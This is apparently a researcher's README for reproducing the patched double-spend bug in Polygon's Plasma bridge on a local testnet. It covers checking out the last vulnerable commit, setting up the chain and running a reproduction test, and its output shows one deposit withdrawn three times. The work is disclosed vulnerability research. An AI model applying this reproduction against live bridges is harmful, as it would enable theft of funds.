### Polygon (Matic) Hack
- $2M white hat hacker bounty paid
- Writeup [here](https://gerhard-wagner.medium.com/double-spending-bug-in-polygons-plasma-bridge-2e0954ccadf1)
- The commit that fixes it is [here](https://github.com/maticnetwork/contracts/commit/283b8d2c1a9ff3dc88538820ffc4ea6a2459c040)
- It was merged [here](https://github.com/maticnetwork/contracts/pull/381). Latest should not exhibit the bug. `718bf86fada5dbd2fedcea0184a59921a625f356` should exhibit the bug.

### Polygon Setup on Ubuntu 18.04
- `git clone https://github.com/maticnetwork/contracts.git matic_contracts`
- `cp DoubleSpendRepro.test.js matic_contracts/test/integration/root/predicates/`
- `cd matic_contracts`
- `git checkout 718bf86fada5dbd2fedcea0184a59921a625f356` This is the last commit before it was fixed.
- Install dependencies: `sudo apt install gcc g++ make python`
- Install [nvm](https://github.com/nvm-sh/nvm)
- `nvm install 8.11.3`
- `nvm use 8.11.3`
- `node --version` should be 8.11.3
- `npm install`
- Install [Docker](https://docs.docker.com/engine/install/ubuntu/)
- Fix Docker permissions [here](https://docs.docker.com/engine/install/linux-postinstall/)
- Compile the test network: `npm run template:process -- --bor-chain-id 80001`
- `npm run truffle:compile`, should see `Compiled successfully using:`

### Polygon Run
- Run the main chain: `npm run testrpc`
- Run the matic sidechain: `npm run bor:simulate`, or stop an existing matic sidechain: `npm run bor:clean`
- Deploy the contracts: `npm run truffle:migrate`
- Set the command to only run our unit test, modify `npm test` in package.json to execute: `truffle test test/integration/root/predicates/DoubleSpendRepro.test.js --migrations_directory migrations_null`
- Run tests: `npm test`. Note that running `npm test` runs the migration.
- You will see this output:
```
  Contract: ReproduceDoubleSpendBug
    reproduceDoubleSpendBug
Deposit amount: 10000000000000000000
Before transfer root tokens: 0
Before transfer child tokens: 0
Before deposit root tokens: 10000000000000000000
Before deposit child tokens: 0
After deposit root tokens: 0
After deposit child tokens: 10000000000000000000
After withdraw root tokens: 0
After withdraw child tokens: 0
Branch mask:0x0080
After exit transaction root tokens: 0
After exit transaction child tokens: 0
After process exit root tokens: 10000000000000000000
After process exit child tokens: 0
Branch mask:0x0180
After exit transaction root tokens: 10000000000000000000
After exit transaction child tokens: 0
After process exit root tokens: 20000000000000000000
After process exit child tokens: 0
Branch mask:0x0280
After exit transaction root tokens: 20000000000000000000
After exit transaction child tokens: 0
After process exit root tokens: 30000000000000000000
After process exit child tokens: 0
```
The above successfully shows the attack where the user has withdrawn their tokens multiple times on the same deposit. 

### TODO
- It takes me 2min33s to run my test, how do I improve this iteration time? It's caused by truffle's migrations and deploys on every run.
- Why do I have to disable the bor chain id check in Root.sol? It's something to do with the test net setup
- Why do I not have to wait the 7 day challenge period to get the tokens back on the Ethereum side in my unit testing? Is something disabling it in the test net?
